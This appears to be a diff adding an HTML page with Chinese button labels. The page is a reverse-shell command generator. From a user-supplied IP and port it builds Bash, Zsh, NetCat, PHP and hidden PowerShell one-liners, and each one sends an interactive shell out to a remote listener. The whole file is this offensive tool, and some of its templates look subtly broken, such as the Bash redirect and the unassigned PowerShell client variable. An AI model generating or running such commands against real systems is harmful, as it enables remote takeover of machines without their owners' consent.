@@ -1,0 +1,99 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="reverse_shell.css">
+	<title></title>
+
+</head>
+<body>
+	<form >
+		<fieldset>
+			<legend>Basic input</legend>
+		<b>ip</b>
+		<input type="txt" name="ip" id="ip">
+		<b>port</b>
+		<input type="txt" name="port" id="port">
+		<button  type="button" onclick="create_command()">生成</button>
+		</fieldset>
+
+
+		<div class="form-group row">
+			<label class="col-sm-2 col-form-label">Bash</label>
+			<textarea id="bash" rows="1" cols="50"></textarea>	
+			<button class="btn-success btn"  onclick ="copy('bash','value')">复制</button>
+		</div>
+
+		<div  class="form-group row">
+			<label class="col-sm-2 col-form-label">Zsh</label>
+			<textarea id="zsh" rows="1" cols="50" ></textarea>
+			<button class="btn-success btn"  onclick ="copy('zsh','value')">复制</button>
+		</div>
+
+		<div  class="form-group row">
+			<label class="col-sm-2 col-form-label">NetCat</label>
+			<textarea id="netcat" rows="1" cols="50"  ></textarea>
+			<button class="btn-success btn"  onclick ="copy('netcat','value')">复制</button>
+		</div>
+
+		<div  class="form-group row">
+			<label class="col-sm-2 col-form-label">PHP</label>
+			<textarea id="php" rows="1" cols="50" ></textarea>
+			<button class="btn-success btn" onclick ="copy('php','value')">复制</button>
+		</div>
+
+		<div  class="form-group row">
+			<label class="col-sm-2 col-form-label">PowerShell</label>
+			<textarea id="powershell" rows="1" cols="50" ></textarea>
+			<button class="btn-success btn"  onclick ="copy('powershell','value')">复制</button>
+		</div>
+	</form>
+
+</body>
+</html>
+
+
+
+<script type="text/javascript">
+	
+	
+	function copy(id ,va)
+
+	{
+		const inputEle = document.getElementById(id);
+		inputEle.select();
+		document.execCommand("Copy");
+		alert("已复制")
+	}
+
+	
+
+	function create_command()
+	{
+		var ip=document.getElementById("ip");
+		var port=document.getElementById("port");
+		var bash=document.getElementById("bash");
+		var zsh=document.getElementById("zsh");
+		var netcat=document.getElementById("netcat");
+		var php=document.getElementById("php");
+		var powershell=document.getElementById("powershell");
+		
+		bash.value="bash -c 'exec bash -i &>/dev/tcp/"+ip.value+"/"+port.value+" <& ' ";
+		zsh.value="zsh -c 'zmodload zsh/net/tcp && ztcp "+ip.value+" "+port.value+" && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
+		netcat.value="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+ip.value+" "+port.value+" >/tmp/f"
+		php.value="php -r '$sock=fsockopen(&quot"+ip.value+"&quot,"+port.value+");exec(&quot/bin/sh -i <&3 >&3 2>&3&quot);'"
+		powershell.value="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("  + "'"+ip.value+ "'," +port.value+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+
+
+
+
+
+
+	}
+	
+
+
+</script>
